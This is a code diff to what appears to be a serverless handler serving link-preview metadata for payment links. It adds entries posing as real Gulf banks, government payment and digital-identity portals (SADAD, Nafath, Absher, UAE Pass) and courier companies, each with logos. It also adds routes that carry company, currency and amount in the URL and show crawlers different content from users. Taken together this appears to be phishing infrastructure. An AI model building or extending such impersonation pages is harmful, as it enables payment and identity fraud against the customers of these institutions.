@@ -89,7 +89,268 @@ const serviceData = {
     name: "البريد البحريني - Bahrain Post",
     description: "المشغل الوطني للبريد في مملكة البحرين",
     ogImage: "/og-bahpost.jpg"
-  }
+  },
+  // Additional GCC shipping companies
+  albaraka: {
+    name: "مجموعة البركة - Al Baraka Group",
+    description: "خدمات شحن وبنكية متكاملة تابعة لمجموعة البركة",
+    ogImage: "/og-albaraka.jpg"
+  },
+  alfuttaim: {
+    name: "مجموعة فطيم - Al-Futtaim Group",
+    description: "حلول لوجستية متكاملة تشمل الشحن والتوزيع وسلسلة الإمداد",
+    ogImage: "/og-alfuttaim.jpg"
+  },
+  alshaya: {
+    name: "مجموعة الشايع - Alshaya Group",
+    description: "خدمات التوزيع واللوجستيات للتجزئة عبر الخليج",
+    ogImage: "/og-alshaya.jpg"
+  },
+  national: {
+    name: "الخدمات الوطنية للشحن - National Shipping",
+    description: "خدمات شحن وبحرية ولوجستيات شاملة داخل وخارج المملكة",
+    ogImage: "/og-bahri.jpg"
+  },
+  shipco: {
+    name: "شيبكو - Shipco Transport",
+    description: "شحن دولي ومحلي متخصص في الشحن البحري والجوي",
+    ogImage: "/og-shipco.jpg"
+  },
+  hellmann: {
+    name: "هيلمان العالمية - Hellmann Worldwide",
+    description: "شبكة دولية لخدمات الشحن واللوجستيات",
+    ogImage: "/og-hellmann.jpg"
+  },
+  dsv: {
+    name: "دي إس في - DSV",
+    description: "حلول شحن ولوجستيات متطورة تشمل الشحن الجوي والبحري والبري",
+    ogImage: "/og-dsv.jpg"
+  },
+  agility: {
+    name: "أجيليتي - Agility Logistics",
+    description: "خدمات لوجستية وشحن متطورة وحلول سلسلة إمداد واسعة النطاق",
+    ogImage: "/og-genacom.jpg"
+  },
+  jinaken: {
+    name: "جيناكن - Jinaken",
+    description: "شركة توصيل عُمانية محلية تقدم خدمات التوصيل والشحن داخل السلطنة",
+    ogImage: "/og-jinaken.jpg"
+  },
+  jinakum: {
+    name: "جيناكم - Jinakum",
+    description: "خدمات دفع وتحويل آمنة وموثوقة",
+    ogImage: "/og-jinakum.jpg"
+  },
+  // Government payment systems
+  sadad: {
+    name: "سداد - SADAD",
+    description: "نظام سداد السعودي — منصة الدفع الإلكتروني الموحد للخدمات الحكومية",
+    ogImage: "/gov-sadad.png"
+  },
+  jaywan: {
+    name: "جيوان - Jaywan",
+    description: "نظام الدفع الإلكتروني الموحد في الإمارات",
+    ogImage: "/gov-jaywan.png"
+  },
+  dirham: {
+    name: "درهم - Dirham Payment",
+    description: "بوابة الدفع الإلكتروني درهم في الإمارات — دفع آمن وفوري",
+    ogImage: "/gov-dirham.png"
+  },
+  knet: {
+    name: "كي نت - KNET",
+    description: "شبكة الدفع الإلكترونية في الكويت — تحويلات فورية وآمنة",
+    ogImage: "/gov-knet.png"
+  },
+  benefit: {
+    name: "بنفت - BENEFIT",
+    description: "شبكة الدفع الإلكتروني في البحرين — خدمات مصرفية رقمية",
+    ogImage: "/gov-benefit.png"
+  },
+  maal: {
+    name: "مال - Maal",
+    description: "نظام الدفع الإلكتروني الموحد في سلطنة عُمان",
+    ogImage: "/gov-maal.png"
+  },
+  qatar_gov: {
+    name: "بوابة الدفع الحكومية - قطر",
+    description: "نظام الدفع الحكومي في دولة قطر — سداد آمن للخدمات الحكومية",
+    ogImage: "/gov-qatar.png"
+  },
+  nafath: {
+    name: "نفذ - Nafath IAM",
+    description: "منصة الهوية الرقمية الوطنية — تسجيل آمن وموثوق",
+    ogImage: "/gov-nafath.png"
+  },
+  absher: {
+    name: "أبشر - Absher",
+    description: "منصة أبشر السعودية — خدمات حكومية متكاملة",
+    ogImage: "/gov-absher.png"
+  },
+  uae_pass: {
+    name: "الهوية الرقمية - UAE Pass",
+    description: "الهوية الرقمية لدولة الإمارات — خدمات رقمية موحدة",
+    ogImage: "/gov-uae-pass.png"
+  },
+  sahel: {
+    name: "سهل - Sahel App",
+    description: "تطبيق سهل — منصة خدمات حكومية متكاملة",
+    ogImage: "/gov-sahel.png"
+  },
+  metrash2: {
+    name: "مترش ٢ - Metrash2",
+    description: "منصة Metrash2 القطرية — خدمات حكومية رقمية",
+    ogImage: "/gov-metrash2.png"
+  },
+  // Banks
+  alrajhi_bank: {
+    name: "مصرف الراجحي - Al Rajhi Bank",
+    description: "أكبر بنك إسلامي في العالم — خدمات مصرفية رقمية آمنة",
+    ogImage: "/og-bank-alrajhi_bank.jpg"
+  },
+  snb: {
+    name: "البنك الأهلي السعودي - SNB",
+    description: "البنك الأهلي السعودي — أكبر بنك في المملكة",
+    ogImage: "/og-bank-snb.jpg"
+  },
+  enbd: {
+    name: "الإمارات دبي الوطني - Emirates NBD",
+    description: "مجموعة مصرفية رائدة في الإمارات — خدمات رقمية متقدمة",
+    ogImage: "/og-bank-enbd.jpg"
+  },
+  nbk: {
+    name: "البنك الوطني الكويتي - NBK",
+    description: "أقدم بنك في الكويت — خدمات مصرفية شاملة",
+    ogImage: "/og-bank-nbk.jpg"
+  },
+  qnb: {
+    name: "مجموعة QNB - البنك التجاري القطري",
+    description: "أكبر بنك في قطر والشرق الأوسط وأفريقيا",
+    ogImage: "/og-bank-qnb.jpg"
+  },
+  bank_muscat: {
+    name: "بنك مسقط - Bank Muscat",
+    description: "أكبر بنك في سلطنة عُمان — خدمات رقمية شاملة",
+    ogImage: "/og-bank-bank_muscat.jpg"
+  },
+  stc_pay: {
+    name: "STC Pay",
+    description: "محفظة رقمية من STC — تحويلات فورية داخل المملكة",
+    ogImage: "/og-bank-stc_pay.jpg"
+  },
+  mada: {
+    name: "مدى - mada",
+    description: "شبكة مدى السعودية — أكبر شبكة بطاقات مصرفية في المملكة",
+    ogImage: "/og-bank-mada.jpg"
+  },
+  riyad_bank: {
+    name: "بنك الرياض - Riyad Bank",
+    description: "بنك الرياض — حلول مصرفية متكاملة للأفراد والشركات",
+    ogImage: "/og-bank-riyad_bank.jpg"
+  },
+  alahli_bank: {
+    name: "البنك الأهلي - Al Ahli Bank",
+    description: "البنك الأهلي — خدمات مصرفية إسلامية وتقليدية",
+    ogImage: "/og-bank-alahli_bank.jpg"
+  },
+  alinma_bank: {
+    name: "مصرف الإنماء - Alinma Bank",
+    description: "مصرف الإنماء — بنك إسلامي سعودي رائد",
+    ogImage: "/og-bank-alinma_bank.jpg"
+  },
+  // Service types
+  government_payment: {
+    name: "الدفع الحكومي - Government Payment",
+    description: "بوابة الدفع الحكومية الآمنة — سداد فواتير الخدمات الحكومية",
+    ogImage: "/assets/dynamic-identity/hero-gov.svg"
+  },
+  health_links: {
+    name: "الخدمات الصحية - Health Services",
+    description: "منصة الخدمات الصحية — دفع آمن للفواتير الطبية",
+    ogImage: "/assets/dynamic-identity/hero-health.svg"
+  },
+  chalets: {
+    name: "حجز الشاليهات - Chalet Booking",
+    description: "نظام حجز الشاليهات — دفع آمن لحجز استراحتك",
+    ogImage: "/assets/dynamic-identity/hero-chalets.svg"
+  },
+  invoices: {
+    name: "إدارة الفواتير - Invoice Management",
+    description: "نظام إدارة ودفع الفواتير الإلكترونية",
+    ogImage: "/assets/dynamic-identity/hero-invoice.svg"
+  },
+  contracts: {
+    name: "إدارة العقود - Contract Management",
+    description: "نظام إدارة العقود — دفع آمن للخدمات التعاقدية",
+    ogImage: "/assets/dynamic-identity/hero-contract.svg"
+  },
+  local_payment: {
+    name: "الدفع المحلي - Local Payment",
+    description: "بوابة الدفع المحلية الآمنة",
+    ogImage: "/assets/dynamic-identity/hero-local.svg"
+  },
+  bank_pages: {
+    name: "صفحات البنوك - Bank Pages",
+    description: "بوابة مصرفية آمنة — دفع عبر البنك مباشرة",
+    ogImage: "/assets/dynamic-identity/hero-bank.svg"
+  },
+  // New government entities
+  tawakkalna: {
+    name: "توكلنا - Tawakkalna",
+    description: "تطبيق الخدمات الحكومية الرسمي في المملكة العربية السعودية",
+    ogImage: "/og-tawakkalna.jpg"
+  },
+  digital_dubai: {
+    name: "دبي الرقمية - Digital Dubai",
+    description: "التحول الرقمي لحكومة دبي",
+    ogImage: "/og-digital-dubai.jpg"
+  },
+  tamm_abudhabi: {
+    name: "تم - TAMM Abu Dhabi",
+    description: "منصة حكومة أبوظبي الموحدة",
+    ogImage: "/og-tamm.jpg"
+  },
+  tasdeed: {
+    name: "تسديد - Tasdeed",
+    description: "منصة السداد الحكومية في الكويت",
+    ogImage: "/og-tasdeed.jpg"
+  },
+  dubaipay: {
+    name: "دبي باي - DubaiPay",
+    description: "بوابة الدفع الإلكتروني في دبي",
+    ogImage: "/og-dubaipay.jpg"
+  },
+  hukoomi: {
+    name: "حكومي - Hukoomi",
+    description: "بوابة الحكومة القطرية الموحدة",
+    ogImage: "/og-hukoomi.jpg"
+  },
+  fawri: {
+    name: "فوري - Fawri",
+    description: "خدمة الدفع الفوري في البحرين",
+    ogImage: "/og-fawri.jpg"
+  },
+  omannet: {
+    name: "عمان نت - OmanNet",
+    description: "شبكة الدفع الإلكتروني في سلطنة عُمان",
+    ogImage: "/og-omannet.jpg"
+  },
+  // New banks
+  kfh: {
+    name: "بيت التمويل الكويتي - KFH",
+    description: "بنك إسلامي كويتي رائد",
+    ogImage: "/og-bank-kfh.jpg"
+  },
+  fab: {
+    name: "بنك أبوظبي الأول - FAB",
+    description: "أكبر بنك في الإمارات",
+    ogImage: "/og-bank-fab.jpg"
+  },
+  adib: {
+    name: "بنك أبوظبي الإسلامي - ADIB",
+    description: "خدمات مصرفية إسلامية في أبوظبي",
+    ogImage: "/og-bank-adib.jpg"
+  },
 };
 
 // Country data mapping
@@ -149,28 +410,45 @@ exports.handler = async (event, context) => {
     // Continue with meta tag generation for both crawlers and regular users
     // Crawlers will read meta tags, regular users will be redirected via JavaScript
   
-  // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
+  // Extract parameters from path: /r/:country/:type/:id or /pay/:id/... or /p/:id/:company/:currency/:amount
   let pathMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
   let countryCode, type, id;
-  
+
   if (pathMatch) {
     [, countryCode, type, id] = pathMatch;
   } else {
-    // Handle payment page routes: /pay/:id/...
-    pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)\/(.+)$/);
+    // Handle /p/:id/:company/:currency/:amount format
+    pathMatch = path.match(/^\/p\/([a-zA-Z0-9-]+)\/([^\/]+)\/([^\/]+)\/([^\/]+)(\/)?$/);
     if (pathMatch) {
-      [, id, subPath] = pathMatch;
-      // For payment pages, we need to determine the type from the link data
-      type = 'shipping'; // Default to shipping for payment pages
-      countryCode = 'SA'; // Default country, will be overridden by link data
+      [, id, serviceKeyFromPath, currencyFromPath, amountFromPath] = pathMatch;
+      type = 'shipping';
+      countryCode = 'SA';
+      // Inject the company into query params so downstream logic picks it up
+      if (!queryStringParameters) queryStringParameters = {};
+      queryStringParameters.company = decodeURIComponent(serviceKeyFromPath);
+      console.log('Extracted service from /p/ path:', serviceKeyFromPath);
     } else {
-      // Invalid path - serve React app HTML directly without redirects
-      return {
-        statusCode: 200,
-        headers: {
-          'Content-Type': 'text/html; charset=utf-8',
-        },
-        body: `<!doctype html>
+      // Handle payment page routes: /pay/:id/...
+      pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)\/(.+)$/);
+      if (pathMatch) {
+        [, id, subPath] = pathMatch;
+        type = 'shipping';
+        countryCode = 'SA';
+      } else {
+        // Handle /pay/:id (no sub-path)
+        pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)$/);
+        if (pathMatch) {
+          [, id] = pathMatch;
+          type = 'shipping';
+          countryCode = 'SA';
+        } else {
+          // Invalid path - serve React app HTML directly
+          return {
+            statusCode: 200,
+            headers: {
+              'Content-Type': 'text/html; charset=utf-8',
+            },
+            body: `<!doctype html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -184,15 +462,11 @@ exports.handler = async (event, context) => {
     <div id="root"></div>
     <script type="module" crossorigin src="/assets/index-BZCOhTKg.js"></script>
     <link rel="stylesheet" crossorigin href="/assets/index-DN9Pz8ru.css">
-    <script>
-      // Update browser history for React Router
-      if (window.history && window.history.replaceState) {
-        window.history.replaceState({}, '', window.location.pathname + window.location.search);
-      }
-    </script>
   </body>
 </html>`
-      };
+          };
+        }
+      }
     }
   }
   
